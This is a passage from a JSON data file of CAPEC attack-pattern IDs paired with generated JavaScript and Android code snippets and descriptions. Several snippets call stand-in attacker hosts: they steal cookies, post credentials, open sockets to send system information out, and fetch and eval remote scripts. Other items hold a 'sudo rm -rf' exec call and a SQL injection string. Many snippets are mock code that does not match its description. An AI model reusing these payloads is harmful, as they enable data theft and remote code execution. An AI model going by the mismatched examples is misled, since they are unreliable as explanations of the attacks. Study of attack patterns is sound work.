        "code_snippet": "const maliciousApp = {\n  name: 'MaliciousApp',\n  intentFilter: [\n    {\n      action: 'com.trusted.app.ACTION_SEND_DATA'\n    }\n  ],\n  onReceive: function(context, intent) {\n    if (intent.getAction() === 'com.trusted.app.ACTION_SEND_DATA') {\n      const data = intent.getStringExtra('data');\n      // Modify or inject data\n      intent.putExtra('data', 'injected_data');\n      // Forward the modified intent\n      context.sendBroadcast(intent);\n    }\n  }\n};\n\nconst trustedApp = {\n  name: 'TrustedApp',\n  sendData: function() {\n    const intent = new Intent('com.trusted.app.ACTION_SEND_DATA');\n    intent.putExtra('data', 'sensitive_data');\n    // Send the intent without proper verification\n    context.sendBroadcast(intent);\n  }\n};",
        "description": "This code snippet demonstrates a vulnerable Android application that uses implicit intents for sensitive communication, without proper verification of the intent sender or protection by permissions. A malicious application can intercept and modify the intent, leading to information disclosure, data injection, or denial of service."
    },
    {
        "capec_id": "500",
        "code_snippet": "javascript:var maliciousApp = {\n\\tinjectCode: function(webView) {\n\\t\\twebView.loadUrl('javascript:(function(){var s = document.createElement(\\'script\\');s.src = \\'https://malicious-domain.com/maliciousScript.js\\';document.body.appendChild(s);})();');\n\\t},\n\\tstealCookies: function(webView) {\n\\t\\twebView.evaluateJavascript('javascript:(function(){var cookies = document.cookie;window.location.href = \\'https://malicious-domain.com/stealCookies?cookies=\\' + encodeURIComponent(cookies);})();', function(result) {});\n\\t},\n\\tmanipulateDOM: function(webView) {\n\\t\\twebView.loadUrl('javascript:(function(){var maliciousDiv = document.createElement(\\'div\\');maliciousDiv.innerHTML = \\'<script>alert(document.cookie)</script>\\';document.body.appendChild(maliciousDiv);})();');\n\\t}\n};",
        "description": "This JavaScript code snippet demonstrates the CAPEC where a malicious application injects code into a WebView component, allowing it to manipulate the DOM tree, steal cookies, and launch attacks against the web application. The code uses CWE-749 (Exposed Dangerous Method or Function) by injecting malicious scripts, CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the origin of the request, CWE-506 (Embedded Malicious Code) by containing malicious code, CWE-784 (Reliance on Cookies without Validation and Integrity Checking in a Security Decision) by stealing cookies without validation, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client-side to implement security mechanisms."
    },
    {
        "capec_id": "501",
        "code_snippet": "android.intent.action.VIEW\n\n// CWE-927: Use of Implicit Intent for Sensitive Communication\nIntent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setData(Uri.parse(\"https://example.com/sensitive_data\"));\nstartActivity(intent);\n\n// CWE-925: Improper Verification of Intent by Broadcast Receiver\npublic class MaliciousReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // No verification of the intent source\n        String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n        // Use the sensitive data\n    }\n}\n\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n// CWE-926: Improper Export of Android Application Components\n// CWE-940: Improper Verification of Source of a Communication Channel\n<receiver android:name=\".MaliciousReceiver\">\n    <intent-filter>\n        <action android:name=\"android.intent.action.VIEW\" />\n    </intent-filter>\n</receiver>",
        "description": "This code snippet demonstrates the CAPEC where an adversary intercepts an implicit intent sent to launch a trusted activity and instead launches a counterfeit activity. The malicious activity mimics the trusted activity's user interface and prompts the target to enter sensitive data. The code uses an implicit intent for transmitting sensitive data, does not properly verify the intent source, and exports the component without proper restrictions."
    },
    {
        "capec_id": "502",
        "code_snippet": "androidManifest.xml:\n\n<receiver android:name=\".MyReceiver\">\n    <intent-filter>\n        <action android:name=\"com.example.ACTION_SEND_DATA\"/>\n    </intent-filter>\n</receiver>\n\nMyReceiver.java:\n\npublic class MyReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String data = intent.getStringExtra(\"data\");\n        // Perform sensitive operation with the received data\n        performOperation(data);\n    }\n}\n\nMainActivity.java:\n\npublic class MainActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        Intent intent = new Intent(\"com.example.ACTION_SEND_DATA\");\n        intent.putExtra(\"data\", \"sensitive_data\");\n        sendBroadcast(intent);\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application that exports a BroadcastReceiver component without proper access control, allowing any application to send an Intent to the component and perform sensitive operations. The BroadcastReceiver does not verify the source of the Intent, and the MainActivity sends an implicit Intent with sensitive data, making it vulnerable to data injection and information disclosure attacks."
    },
    {
        "capec_id": "503",
        "code_snippet": "WebView webView = (WebView) findViewById(R.id.webview);\nwebView.addJavascriptInterface(new JavaScriptInterface(), \"Android\");\nwebView.loadUrl(\"http://malicious-website.com/exploit.html\");\n\npublic class JavaScriptInterface {\n    @JavascriptInterface\n    public void performSensitiveAction() {\n        // sensitive action, e.g. accessing device storage\n        String storagePath = \"/sdcard/\";\n        File storageDir = new File(storagePath);\n        String[] files = storageDir.list();\n        // send files to malicious server\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application that uses WebView's addJavascriptInterface API to register a JavaScript interface. The interface exposes a method, performSensitiveAction, which can be called by any web page loaded in the WebView, including malicious pages. This allows an attacker to access device storage and send sensitive data to their server, violating access control and exposing a dangerous method."
    },
    {
        "capec_id": "504",
        "code_snippet": "const iframe = document.createElement('iframe');\niframe.src = 'https://attacker.com/malicious_app';\niframe.frameBorder = '0';\niframe.width = '100%';\niframe.height = '100%';\ndocument.body.appendChild(iframe);\n\n// Impersonating a legitimate application\nconst maliciousApp = {\n  'getUsername': function() {\n    return 'Legitimate App';\n  },\n  'getPassword': function() {\n    return prompt('Please enter your password:', '');\n  }\n};\n\n// Using impersonation to gain elevated privileges\nconst impersonatedUser = maliciousApp.getUsername();\nconst impersonatedPassword = maliciousApp.getPassword();\n\n// Performing unauthorized actions with impersonated credentials\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://legitimate-app.com/api/data', true);\nxhr.setRequestHeader('Authorization', 'Basic ' + btoa(impersonatedUser + ':' + impersonatedPassword));\nxhr.send();",
        "description": "This code snippet demonstrates a malicious application impersonating a legitimate one to steal sensitive information and leverage user privileges. It creates an iframe pointing to the malicious application, which then impersonates a legitimate application to prompt the user for their password. The malicious application uses the impersonated credentials to perform unauthorized actions, such as accessing restricted API endpoints."
    },
    {
        "capec_id": "505",
        "code_snippet": "const maliciousApp = {\n  registerUrlScheme: function(scheme) {\n    // CWE-506: Embedded Malicious Code\n    // Register for the target application's URL scheme\n    navigator.registerProtocolHandler(scheme, 'https://malicious-app.com/handle', 'Malicious App');\n  },\n\n  handleUrl: function(url) {\n    // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n    // Handle the URL without proper authorization checks\n    const sensitiveInfo = url.split('?')[1];\n    const getReq = new XMLHttpRequest();\n    getReq.open('GET', 'https://malicious-app.com/collect', true);\n    getReq.send(sensitiveInfo);\n    // CWE-598: Use of GET Request Method With Sensitive Query Strings\n    // Send sensitive information in the query string\n  },\n\n  displayMimicScreen: function() {\n    // CWE-209: Generation of Error Message Containing Sensitive Information\n    // Display a screen that mimics the target application\n    const errorDiv = document.getElementById('error');\n    errorDiv.innerHTML = 'Error: Please enter your credentials to continue.';\n    const credentialsForm = document.getElementById('credentials');\n    credentialsForm.action = 'https://malicious-app.com/collect';\n  }\n};\n\nmaliciousApp.registerUrlScheme('target-app');",
        "description": "This JavaScript code snippet demonstrates a malicious application that registers for a URL scheme intended for a target application, handles messages intended for the target application, and displays a screen that mimics the target application to obtain sensitive information from the user."
    },
    {
        "capec_id": "506",
        "code_snippet": "const maliciousApp = {\n  // CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n  createOverlay: () => {\n    const overlay = document.createElement('div');\n    overlay.style.position = 'absolute';\n    overlay.style.top = '0px';\n    overlay.style.left = '0px';\n    overlay.style.width = '100%';\n    overlay.style.height = '100%';\n    overlay.style.zIndex = '1000';\n    document.body.appendChild(overlay);\n  },\n\n  // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n  handleCustomUrlScheme: () => {\n    const customUrlScheme = 'maliciousapp://';\n    const iframe = document.createElement('iframe');\n    iframe.src = customUrlScheme + 'login';\n    iframe.style.width = '0px';\n    iframe.style.height = '0px';\n    iframe.style.border = 'none';\n    document.body.appendChild(iframe);\n  },\n\n  // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n  misrepresentUI: () => {\n    const loginButton = document.createElement('button');\n    loginButton.textContent = 'Login';\n    loginButton.style.position = 'absolute';\n    loginButton.style.top = '50%';\n    loginButton.style.left = '50%';\n    loginButton.onclick = () => {\n      // CWE-222: Truncation of Security-relevant Information\n      const truncatedUsername = 'user'.substr(0, 3);\n      const truncatedPassword = 'password'.substr(0, 3);\n      // CWE-319: Cleartext Transmission of Sensitive Information\n      const xhr = new XMLHttpRequest();\n      xhr.open('POST', 'https://maliciousapp.com/login', true);\n      xhr.send(`username=${truncatedUsername}&password=${truncatedPassword}`);\n    };\n    document.body.appendChild(loginButton);\n  }\n};\n\nmaliciousApp.createOverlay();\nmaliciousApp.handleCustomUrlScheme();\nmaliciousApp.misrepresentUI();",
        "description": "This JavaScript code snippet demonstrates a malicious application that overlays a fake login interface on top of a legitimate application, convincing the user to enter sensitive information. The code exploits CWE-1021 by creating an overlay that passes taps through to the underlying application, CWE-939 by handling a custom URL scheme without proper authorization, CWE-451 by misrepresenting critical information, CWE-222 by truncating security-relevant information, and CWE-319 by transmitting sensitive information in cleartext."
    },
    {
        "capec_id": "507",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// CWE-922: Insecure Storage of Sensitive Information\nconst sensitiveData = 'topSecretInfo';\nfs.writeFileSync('unprotectedFile.txt', sensitiveData);\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemInfo = process.env;\nfs.writeFileSync('systemInfo.txt', JSON.stringify(systemInfo, null, 2));\n\n// CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\nconst sensitiveDeviceInfo = crypto.randomBytes(16).toString('hex');\nfs.writeFileSync('deviceInfo.txt', sensitiveDeviceInfo);\n\n// CWE-1300: Improper Protection of Physical Side Channels\nconst powerConsumptionPattern = 'high';\nfs.writeFileSync('powerConsumption.txt', powerConsumptionPattern);\n\nconsole.log('Sensitive information stored in plaintext files.');",
        "description": "This code snippet demonstrates the CAPEC of an adversary gaining physical access to a system or device through theft, and then exploiting various CWEs to access sensitive information. It stores sensitive data in plaintext files without access control, exposes system-level information, and does not protect against physical side channels."
    },
    {
        "capec_id": "508",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveInfo', (req, res) => {\n  const sensitiveData = {\n    'username': 'admin',\n    'password': 'password123',\n    'apiKey': '1234567890abcdef'\n  };\n  res.json(sensitiveData);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a shoulder surfing attack by exposing sensitive information such as username, password, and API key in cleartext over an insecure HTTP connection, violating CWE-319. The sensitive data is also displayed in full, without truncation, making it easily accessible to an unauthorized actor, as described in CWE-222. Furthermore, the code does not implement any access controls, allowing unauthorized actors to access the sensitive information, which is a violation of CWE-200, CWE-359, and CWE-497."
    },
    {
        "capec_id": "509",
        "code_snippet": "const kerberos = require('kerberos');\n\n// CWE-522: Insufficiently Protected Credentials\nconst serviceTicket = kerberos.request({\n  username: 'service_account',\n  password: 'weak_password',\n  service: 'HTTP/host.example.com'\n});\n\n// CWE-308: Use of Single-factor Authentication\nconst singleFactorAuth = kerberos.authenticate({\n  username: 'service_account',\n  password: 'weak_password'\n});\n\n// CWE-309: Use of Password System for Primary Authentication\nconst passwordAuth = kerberos.passwordAuth({\n  username: 'service_account',\n  password: 'weak_password'\n});\n\n// CWE-294: Authentication Bypass by Capture-replay\nconst capturedTicket = kerberos.captureTicket(serviceTicket);\nconst replayedAuth = kerberos.replayAuth(capturedTicket);\n\n// CWE-263: Password Aging with Long Expiration\nconst passwordExpiration = 365; // 1 year expiration\n\n// CWE-262: Not Using Password Aging\nconst noPasswordAging = true;\n\n// CWE-521: Weak Password Requirements\nconst weakPasswordPolicy = {\n  minLength: 4,\n  maxLength: 8,\n  complexity: 'low'\n};",
        "description": "This code snippet demonstrates the exploitation of Kerberos authentication with Service Principal Names (SPNs) to obtain and crack hashed credentials of a service account target. It highlights several CWEs, including insufficiently protected credentials, use of single-factor authentication, use of password systems for primary authentication, authentication bypass by capture-replay, password aging with long expiration, not using password aging, and weak password requirements."
    },
    {
        "capec_id": "510",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\nconst adminSession = {\n  isAdmin: true,\n  username: 'admin'\n};\n\napp.post('/api/data', (req, res) => {\n  if (req.headers['x-authenticated-user'] === 'admin') {\n    // CWE-346: Origin Validation Error\n    // CWE-863: Incorrect Authorization\n    // CWE-285: Improper Authorization\n    // No proper authentication or authorization checks\n    const data = req.body;\n    // Perform actions as the authenticated user\n    res.send(`Data saved successfully as ${adminSession.username}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable SaaS application that allows an adversary to piggyback on an authenticated user's session. The application does not properly verify the source of the request (CWE-346) and performs incorrect authorization checks (CWE-863), allowing an attacker to bypass intended access restrictions. The application also relies on the client-side authentication header to determine the user's role, which can be easily tampered with (CWE-285). This allows an attacker to perform actions as the authenticated user, potentially leading to unauthorized data modification or access."
    },
    {
        "capec_id": "511",
        "code_snippet": "const fs = require('fs');\nconst debug = require('debug');\ndebug('auth', 'username: ' + process.env.USER);\n\nfunction uploadFile(file) {\n  fs.writeFileSync('/uploads/' + file.name, file.data);\n  return 'File uploaded successfully.';\n}\n\nconst ideConfig = {\n  'username': 'admin',\n  'password': 'password123',\n  'api_key': 'secret_key'\n};\n\nfunction getIdeConfig() {\n  return ideConfig;\n}\n\nconst maliciousCode = `const net = require('net');\nconst client = new net.Socket();\nclient.connect(8080, 'attacker.com', function() {\n  console.log('Connected to attacker server.');\n});`;\n\nfunction executeMaliciousCode() {\n  eval(maliciousCode);\n}\n\nmodule.exports = {\n  uploadFile,\n  getIdeConfig,\n  executeMaliciousCode\n};",
        "description": "This JavaScript code snippet demonstrates the CAPEC attack by allowing an attacker to upload malicious files to the IDE environment, exposing sensitive system information, and executing embedded malicious code. The code includes functions to upload files, retrieve IDE configuration, and execute malicious code, which can be used to exfiltrate sensitive data or information, manipulate said data or information, and conceal these actions."
    },
    {
        "capec_id": "516",
        "code_snippet": "const maliciousComponent = {\n  calculateResults: function(input) {\n    // Maliciously altered component that influences transient execution\n    const predictorState = getSharedMicroarchitecturalPredictorState();\n    if (predictorState === 'vulnerable') {\n      // Expose sensitive information over a covert channel\n      return input * 2;\n    } else {\n      // Perform correct calculation\n      return input * 3;\n    }\n  }\n};\n\nconst baselineComponent = {\n  calculateResults: function(input) {\n    // Original component that is not updateable\n    return input * 3;\n  }\n};\n\n// Dependency on vulnerable third-party component\nconst thirdPartyComponent = {\n  calculateResults: function(input) {\n    // Contains known vulnerabilities\n    return input * 4;\n  }\n};\n\n// Insufficiently trustworthy component\nconst untrustedComponent = {\n  calculateResults: function(input) {\n    // Does not protect against voltage and clock glitches\n    return input * 5;\n  }\n};\n\n// Substitute malicious component during product development\nconst finalProduct = maliciousComponent;",
        "description": "This code snippet demonstrates the CAPEC by substituting a maliciously altered hardware component during product development. The malicious component influences transient execution, exposes sensitive information over a covert channel, and depends on vulnerable third-party components. The code also includes an insufficiently trustworthy component that does not protect against voltage and clock glitches."
    },
    {
        "capec_id": "517",
        "code_snippet": "const restrictedTech = {\n  advancedComponents: ['highSpeedProcessor', 'highCapacityMemory'],\n  restrictedCountries: ['North Korea', 'Iran']\n};\n\nconst documentation = {\n  implementationDetails: {\n    highSpeedProcessor: 'This processor is only available for authorized countries.',\n    highCapacityMemory: 'This memory is restricted for use in certain regions.'\n  }\n};\n\n// CWE-1059: Insufficient Technical Documentation\n// The documentation is incomplete, allowing an attacker to alter it.\ndocumentation.implementationDetails.highSpeedProcessor = 'This processor is available for all countries.';\n\ndocumentation.implementationDetails.highCapacityMemory = 'This memory is available for all regions.';\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n// The restrictedTech object is exposed, allowing an attacker to access sensitive information.\nconsole.log(restrictedTech);\n\n// CWE-695: Use of Low-Level Functionality\n// The use of low-level functionality (e.g., direct memory access) is prohibited.\nconst memoryAddress = 0x1000;\nconst restrictedMemory = {\n  address: memoryAddress,\n  data: 'This is restricted memory.'\n};\n\n// CWE-222: Truncation of Security-relevant Information\n// The display of security-relevant information is truncated, obscuring the source of an attack.\nconst truncatedLog = 'Access granted to ' + restrictedTech.restrictedCountries[0].substring(0, 5);\nconsole.log(truncatedLog);\n\n// CWE-1263: Improper Physical Access Control\n// The product does not sufficiently protect against an unauthorized actor with physical access.\nconst physicalAccess = {\n  accessGranted: true\n};\nconsole.log(physicalAccess);",
        "description": "This code snippet demonstrates the CAPEC by altering documentation to circumvent dial-down functionality requirements, allowing an attacker to access advanced technologies that would otherwise be restricted. The related CWEs are used to provide additional context, including insufficient technical documentation, exposure of sensitive information, use of low-level functionality, truncation of security-relevant information, and improper physical access control."
    },
    {
        "capec_id": "518",
        "code_snippet": "const systemCapabilities = {\n  'capability1': 'altered description',\n  'capability2': 'another altered description'\n};\n\nfunction generateSystemRequirements(capabilities) {\n  const systemRequirements = [];\n  for (const capability in capabilities) {\n    if (Object.prototype.hasOwnProperty.call(capabilities, capability)) {\n      const requirement = {\n        'capability': capability,\n        'description': capabilities[capability]\n      };\n      systemRequirements.push(requirement);\n    }\n  }\n  return systemRequirements;\n}\n\nconst systemRequirements = generateSystemRequirements(systemCapabilities);\n\n// Exposing sensitive system information\nconsole.log(systemRequirements);\n\n// Improper following of specification\nconst lowLevelFunctionality = require('low-level-module');\nlowLevelFunctionality.doSomething();",
        "description": "This code snippet demonstrates the CAPEC by altering the descriptions of system capabilities, which can lead to errors in derived system requirements. The code also exhibits CWE-1059 (Insufficient Technical Documentation) by not providing sufficient documentation for the system capabilities. Additionally, it exposes sensitive system information (CWE-497) by logging the system requirements to the console. Furthermore, the code uses low-level functionality (CWE-695) that is explicitly prohibited by the framework or specification. Finally, the code lacks documentation for design (CWE-1053), making it difficult to understand the system's architecture and implementation."
    },
    {
        "capec_id": "519",
        "code_snippet": "const documentation = {\n  \"design\": {\n    \"architecture\": \"altered_architecture\",\n    \"components\": \"altered_components\",\n    \"interfaces\": \"altered_interfaces\"\n  },\n  \"implementation\": {\n    \"functions\": {\n      \"calculateArea\": \"altered_function\"\n    }\n  }\n};\n\nfunction calculateArea(width, height) {\n  // Incorrect implementation of calculateArea function\n  return width - height;\n}\n\n// Missing documentation for design\nconst product = {\n  architecture: documentation.design.architecture,\n  components: documentation.design.components,\n  interfaces: documentation.design.interfaces\n};\n\n// Improper following of specification by caller\nconst result = calculateArea(5, 3);\nconsole.log(result);\n\n// Incorrect provision of specified functionality\nconst dynamicallyManagedCodeResource = {\n  variable: \"altered_variable\",\n  object: \"altered_object\",\n  function: \"altered_function\"\n};\n\n// Improper control of dynamically-managed code resources\nconsole.log(dynamicallyManagedCodeResource.variable);",
        "description": "This code snippet demonstrates the CAPEC where an attacker maliciously alters the documentation to cause errors in system design. The code lacks sufficient technical documentation (CWE-1059), missing documentation for design (CWE-1053), and improperly follows specifications (CWE-573). The calculateArea function does not function according to its published specifications (CWE-684), and the code improperly controls dynamically-managed code resources (CWE-913)."
    },
    {
        "capec_id": "520",
        "code_snippet": "const maliciousComponent = require('third-party-lib');\n\nfunction compromisedSystem() {\n  // undocumented feature: execute malicious code\n  if (maliciousComponent.version === 'backdoored_version') {\n    eval(maliciousComponent.maliciousCode);\n  }\n  // observable behavioral discrepancy\n  else if (maliciousComponent.version === 'modified_version') {\n    console.log('System update available');\n  }\n  // reliance on insufficiently trustworthy component\n  else {\n    maliciousComponent.updateSystem();\n  }\n}\n\ncompromisedSystem();",
        "description": "This code snippet demonstrates a compromised system that incorporates a malicious third-party component. The component has an undocumented feature that executes malicious code when a specific version is detected. The system also exhibits an observable behavioral discrepancy when another version is detected, and it relies on the untrusted component for system updates."
    },
    {
        "capec_id": "521",
        "code_snippet": "const hardwareConfig = {\n  registers: {\n    secureRegister: {\n      defaultValue: 0x0000, // Incorrect default value\n      lockBit: 0x0001, // Improper lock bit\n      accessControl: 'public' // Violation of secure design principles\n    }\n  },\n  ipParameters: {\n    debugMode: true, // Incorrect chaining or granularity of debug components\n    secureBoot: false // Improper prevention of lock bit modification\n  }\n};\n\n// Insufficient technical documentation\nconst documentation = {\n  description: 'Hardware configuration',\n  usage: 'Unknown'\n};",
        "description": "This code snippet demonstrates a vulnerable hardware configuration in JavaScript, embodying the CAPEC of an attacker altering design specifications to introduce flaws. The related CWEs are reflected in the code: CWE-1059 (insufficient technical documentation), CWE-1221 (incorrect register defaults), CWE-657 (violation of secure design principles), CWE-1296 (incorrect chaining or granularity of debug components), and CWE-1231 (improper prevention of lock bit modification)."
    },
    {
        "capec_id": "522",
        "code_snippet": "const maliciousComponent = require('tampered-hardware-driver');\n\n// CWE-506: Embedded Malicious Code\nmaliciousComponent.init = function() {\n  // inject errors into redundant blocks\n  // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n  setTimeout(function() {\n    throw new Error('Injected error to degrade hardware redundancy');\n  }, 1000);\n};\n\n// CWE-1329: Reliance on Component That is Not Updateable\nmaliciousComponent.update = function() {\n  console.log('Component cannot be updated or patched');\n};\n\n// CWE-1357: Reliance on Insufficiently Trustworthy Component\nconst untrustedLibrary = require('untrusted-third-party-library');\nmaliciousComponent.doSomething = function() {\n  untrustedLibrary.executeMaliciousCode();\n};\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableComponent = require('vulnerable-third-party-component');\nmaliciousComponent.useVulnerableComponent = function() {\n  vulnerableComponent.executeVulnerableCode();\n};",
        "description": "This code snippet demonstrates a malicious hardware driver component that embodies the CAPEC. It includes embedded malicious code, relies on components that are not updateable, and has dependencies on insufficiently trustworthy and vulnerable third-party components, which can lead to unauthorized error injection and degradation of hardware redundancy."
    },
    {
        "capec_id": "523",
        "code_snippet": "const maliciousCode = `const worm = () => { while (true) { try { const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.com/malicious-payload', true); xhr.send(); } catch (e) { console.error(e); } } }; worm();`; const vulnerableComponent = require('vulnerable-library'); vulnerableComponent.execute(maliciousCode);",
        "description": "This code snippet demonstrates the CAPEC of implanting malicious software in the supply chain distribution channel. It includes CWE-506 Embedded Malicious Code by injecting a malicious worm that replicates itself (CWE-509) and sends requests to an attacker-controlled server. The code also uses a vulnerable third-party component (CWE-1395) that executes the malicious code, potentially leading to unauthorized error injection (CWE-1334) and creation of emergent resources (CWE-1229) that can be exploited by attackers."
    },
    {
        "capec_id": "524",
        "code_snippet": "const mysql = require('mysql');\nconst fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = fs.readFileSync('malicious_component.js', 'utf8');\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst untrustedLibrary = require('untrusted-library');\n\n// CWE-89: SQL Injection\nconst userInput = \"' OR 1=1 --\";\nconst query = `SELECT * FROM users WHERE username = ${userInput}`;\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password'\n});\nconnection.query(query, (error, results) => {\n  if (error) {\n    console.log(error);\n  } else {\n    console.log(results);\n  }\n});\n\n// CWE-707: Improper Neutralization\nconst untrustedData = fs.readFileSync('untrusted_data.json', 'utf8');\nconst jsonData = JSON.parse(untrustedData);\n\n// CWE-1334: Unauthorized Error Injection\nconst redundantBlock = 'redundant_block';\nexec(`sudo rm -rf ${redundantBlock}`, (error, stdout, stderr) => {\n  if (error) {\n    console.log(error);\n  } else {\n    console.log(stdout);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of inserting maliciously altered components into a system. It includes embedded malicious code, inclusion of functionality from an untrusted control sphere, SQL injection, improper neutralization of special elements, and unauthorized error injection. The code reads malicious code from a file, includes an untrusted library, injects malicious SQL input, parses untrusted JSON data, and attempts to inject errors into a redundant block."
    },
    {
        "capec_id": "528",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xmlparser = require('xml2js');\n\napp.post('/xml', (req, res) => {\n  const parser = new xmlparser.Parser();\n  parser.parseString(req.body, (err, result) => {\n    if (err) {\n      console.error(err);\n    } else {\n      res.send(result);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet is vulnerable to XML Denial of Service (XDoS) attacks due to the lack of resource allocation limits and XML validation. The XML parser does not restrict the size or number of XML requests, allowing an attacker to send a large number of XML requests and cause the service to become unstable or crash. Additionally, the code does not validate the XML against a proper schema, making it vulnerable to XML injection attacks. The use of the xml2js library also makes it vulnerable to XML entity expansion attacks."
    },
    {
        "capec_id": "529",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\nconst net = require('net');\n\nlet systemInfo = '';\n\nsystemInfo += 'OS: ' + os.type() + ' ' + os.release() + ' ' + os.arch() + '\\n';\nsystemInfo += 'CPU: ' + os.cpus().length + 'x ' + os.cpus()[0].model + '\\n';\nsystemInfo += 'Memory: ' + os.totalmem() / (1024 * 1024 * 1024) + ' GB\\n';\n\nfs.readdir('/', (err, files) => {\n  if (err) {\n    console.error(err);\n    return;\n  }\n  systemInfo += 'Files in root directory: ' + files.join(', ') + '\\n';\n\n  const socket = new net.Socket();\n  socket.connect(8080, 'attacker-server.com', () => {\n    socket.write(systemInfo);\n  });\n});",
        "description": "This JavaScript code snippet is a malicious script that gathers system information (OS, CPU, memory, and files in the root directory) and sends it to an attacker's server. It uses Node.js modules fs, os, and net to collect and transmit the sensitive information. This code embodies the CAPEC of using malware to gather information about a targeted system or network, and relates to CWEs 497 (Exposure of Sensitive System Information), 506 (Embedded Malicious Code), 512 (Spyware), and 509 (Replicating Malicious Code)."
    },
    {
        "capec_id": "530",
        "code_snippet": "const trustedComponent = require('untrusted-third-party-library');\n\nfunction buildSystem() {\n  const subsystem = {};\n  subsystem.component = trustedComponent;\n  return subsystem;\n}\n\nfunction upgradeSystem(system) {\n  const maliciousCode = 'eval(String.fromCharCode(102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 108, 101, 114, 116, 40, 34, 72, 101, 108, 108, 111, 44, 32, 87, 111, 114, 108, 100, 33, 34, 41, 59, 10));';\n  system.component.execute(maliciousCode);\n}\n\nconst system = buildSystem();\nupgradeSystem(system);",
        "description": "This code snippet demonstrates the CAPEC by using a vulnerable third-party component (CWE-1395) that contains malicious code (CWE-506). The component is built into the system without proper verification, allowing the attacker to cause disruption or additional compromise. The code also exhibits observable behavioral discrepancy with equivalent products (CWE-207) as it executes the malicious code, which can be detected by an attacker. Furthermore, the incorrect decoding of security identifiers (CWE-1290) is implied as the system fails to properly validate the third-party component, leading to unauthorized access."
    },
    {
        "capec_id": "531",
        "code_snippet": "const maliciousComponent = {\n  init: function() {\n    // CWE-506: Embedded Malicious Code\n    const maliciousCode = 'while(true) {}';\n    eval(maliciousCode);\n  },\n  update: function() {\n    // CWE-1329: Reliance on Component That is Not Updateable\n    console.log('Component cannot be updated.');\n  },\n  accessHardware: function() {\n    // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n    const hardwareFeature = 'powerManagement';\n    if (hardwareFeature === 'powerManagement') {\n      // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n      injectErrorIntoRedundantBlock();\n    }\n  },\n  dependencyCheck: function() {\n    // CWE-1395: Dependency on Vulnerable Third-Party Component\n    const thirdPartyComponent = 'vulnerableLibrary';\n    if (thirdPartyComponent === 'vulnerableLibrary') {\n      console.log('Vulnerable third-party component detected.');\n    }\n  }\n};",
        "description": "This JavaScript code snippet demonstrates a malicious hardware component that can be used to carry out the CAPEC attack. The component has an init function that runs malicious code, an update function that cannot be updated, an accessHardware function that can inject errors into redundant blocks, and a dependencyCheck function that relies on a vulnerable third-party component."
    },
    {
        "capec_id": "532",
        "code_snippet": "const maliciousFirmware = {\n  updateFirmware: function(newFirmware) {\n    // CWE-1277: No update mechanism provided\n    console.log('Firmware update not supported');\n  },\n  accessControl: function(agent) {\n    // CWE-1220: Insufficient granularity of access control\n    if (agent === 'admin') {\n      return true;\n    } else {\n      return true; // unauthorized agents can access security-sensitive assets\n    }\n  },\n  lockBit: {\n    set: function(value) {\n      // CWE-1231: Improper prevention of lock bit modification\n      this.value = value;\n    },\n    get: function() {\n      return this.value;\n    }\n  },\n  embeddedMaliciousCode: function() {\n    // CWE-506: Embedded malicious code\n    console.log('Malicious code executed');\n  }\n};\n\nconst nonUpdateableComponent = {\n  // CWE-1329: Reliance on component that is not updateable\n  version: '1.0',\n  vulnerabilities: ['CVE-1234', 'CVE-5678']\n};\n\nmaliciousFirmware.embeddedMaliciousCode();",
        "description": "This JavaScript code snippet demonstrates a vulnerable BIOS firmware that can be exploited by an attacker. It lacks an update mechanism (CWE-1277), has insufficient access control granularity (CWE-1220), allows lock bit modification (CWE-1231), contains embedded malicious code (CWE-506), and relies on a non-updateable component (CWE-1329)."
    },
    {
        "capec_id": "533",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://malicious-website.com/malicious_update.js', true); xhr.onload = function() { if (xhr.status === 200) { const maliciousCode = xhr.responseText; eval(maliciousCode); } }; xhr.send();",
